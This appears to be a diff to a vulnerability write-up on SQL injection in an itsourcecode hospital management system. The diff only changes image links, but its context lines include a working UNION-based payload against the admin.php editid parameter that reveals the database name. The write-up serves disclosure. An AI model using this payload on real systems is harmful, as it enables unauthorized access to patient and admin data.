@@ -14,7 +14,7 @@
 
 When the Edit button is clicked, a request is sent to query admin information based on editid
 
-![sql_injection1.1](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/hospital-management-system/images/sql_injection1.1.png)
+![sql_injection1.1](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/hospital-management-system/images/sql_injection1.png)
 
 **[+] Payload:** /HMS/admin.php?editid=1'%20union%20select%201%2cdatabase()%2c3%2c4%2c5%2c6%20limit%201%2c1%23
 
@@ -39,4 +39,5 @@ Connection: close
 
 **SQL injection result**：database name is displayed.
 
-![sql_injection1.2](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/hospital-management-system/images/sql_injection1.2.png)
+![sql_injection1.2](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/hospital-management-system/images/sql_injection2.png)
+
